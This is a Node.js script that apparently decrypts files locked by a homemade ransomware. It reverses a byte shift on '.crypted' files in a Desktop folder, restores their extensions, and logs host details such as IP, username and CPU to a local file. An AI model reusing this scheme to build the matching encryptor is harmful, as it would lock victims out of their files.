/*
 * @Author: zwx492293 
 * @Date: 2017-12-15 17:57:26 
 * @Last Modified by: zhoushoujian
 * @Last Modified time: 2017-12-17 22:45:56
 */
const fs = require('fs')
const path = require('path')
const os = require('os')
const child_process = require('child_process')
const year = new Date().getFullYear()
const month = new Date().getMonth() + 1
const day = new Date().getDate()
const hour = new Date().getHours()
const minute = new Date().getMinutes()
const second = new Date().getSeconds()
const time = `${year}-${month}-${day} ${hour}:${minute}:${second} `
const operationPlatform = process.platform  //获取操作系统平台，如win32
const operationCore = os.type()     //获取操作系统内核版本，如windows_NT
const operationArch = process.arch   //获取系统架构，如x64
const operationInfo = `${operationPlatform}_${operationCore}_${operationArch}`
const userName = process.env.USERPROFILE;
const fileFolderPath = `${userName}/Desktop/Email`
//获取ip地址
const networkInterfaces = os.networkInterfaces()
var address;
Object.keys(networkInterfaces).forEach(function (m) {
    for (let n in networkInterfaces[m]) {
        if (networkInterfaces[m][n].family === "IPv4" && networkInterfaces[m][n].address !== "127.0.0.1") {
            address = networkInterfaces[m][n].address;
            return address;
        }
    }
})
const cpuCoreNumber = os.cpus().length  //获取cpu核心（线程）
const cpuModel = os.cpus()[0].model    //获取cpu型号
const cpuSpeed = os.cpus()[0].speed;    //获取cpu主频
const cpuInfo = `${cpuModel}_${cpuCoreNumber} core_${cpuSpeed}MHZ`;
//打印日志模块
fs.appendFile("log.txt", `${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
    encoding: "utf8"
}, function () {
    console.log('process.pid-basic', process.pid)
})
var cryptedFile;
decrypt(fileFolderPath).then(function () {
    // return setWallpaper(1)
}).then(function () {
    console.log("finish!");
});

function decrypt(dst) {
    return new Promise(function (resolve, reject) {
        const promiseArr = [];
        return fs.readdirSync(dst).forEach(function (files) {
            if (path.extname(path.join(dst, files)) !== ".crypted") {
                if (fs.statSync(path.join(dst, files)).isDirectory()) {
                    return decrypt(path.join(dst, files));
                }
            } else {
                const promise = new Promise((res) => {
                    return fs.readFile(path.join(dst, files), (err, buffer) => {
                        //console.log("read",files);
                        if (err) {
                            console.error('readFile err', err)
                            return res()
                        }
                        const buf1 = Buffer.allocUnsafe(buffer.length);
                        for (let i = 0; i < buffer.length; i++) {
                            buf1[i] = buffer[i] - 5;
                        }
                        return fs.writeFile(path.join(dst, files), buf1, function (err) {
                            //console.log("write",files);
                            cryptedFile = `解密的文件：${path.join(dst, files)}`
                            if (err) {
                                console.error('writeFile err', err)
                                return res()
                            }
                            //decrpyted files which are ext'length is 4 chars
                            if (path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "a" &&
                                path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "u" &&
                                path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "m" &&
                                path.basename(path.join(dst, files), `.crypted`).slice(-4, -3) !== "e") {
                                const fileName = Buffer.from(path.basename(path.join(dst, files)).slice(-11, -8))
                                const extNameBuffer = Buffer.allocUnsafe(3)
                                for (let i = 0; i < 3; i++) {
                                    extNameBuffer[i] = fileName[i] + 3;
                                }
                                const newExtName = extNameBuffer.toString()
                                const renameFiles = path.basename(path.join(dst, files), `.crypted`).slice(0, -3) + `.${newExtName}`;
                                console.log("rename", renameFiles);
                                fs.rename(path.join(dst, files), `${path.join(dst, renameFiles)}`)
                            } else {
                                //console.log("decrypted files", cryptedFile);
                                const fileNameF = Buffer.from(path.basename(path.join(dst, files)).slice(-12, -8))
                                const extNameBuffer = Buffer.allocUnsafe(fileNameF.length)
                                for (let i = 0; i < fileNameF.length; i++) {
                                    extNameBuffer[i] = fileNameF[i] + 3;
                                }
                                const newExtName = extNameBuffer.toString()
                                const renameFiles = path.basename(path.join(dst, files), `.crypted`).slice(0, -4) + `.${newExtName}`;
                                console.log("rename", renameFiles);
                                fs.renameSync(path.join(dst, files), `${path.join(dst, renameFiles)}`)
                            }
                            //打印日志模块
                            fs.appendFile("log.txt", ` \r\n ${cryptedFile} `, {
                                encoding: "utf8"
                            }, function () {
                                res();
                            })
                        });
                    });
                })
                promiseArr.push(promise);
            };
            Promise.all(promiseArr).then(function () {
                resolve();
            });
        })
    })
}
function setWallpaper(count) {
    return new Promise(function (resolve, reject) {
        let i = 1;
        let maxCount = 10;
        function innerFunc() {
            setTimeout(function () {
                console.log('count: ', i);
                child_process.exec('recovery.bat',
                    {
                        encoding: 'utf8',
                        timeout: 1000,
                        maxBuffer: 10240 * 1024,
                        cwd: null,
                        env: null
                    },
                    function (error, stdout, stderr) {
                        i++;
                        //console.log('exec: ' , stdout);
                        if (i > count) {
                            resolve();
                        } else {
                            return innerFunc();
                        }
                    });
            }, 300);

        }
        innerFunc();
    });
}



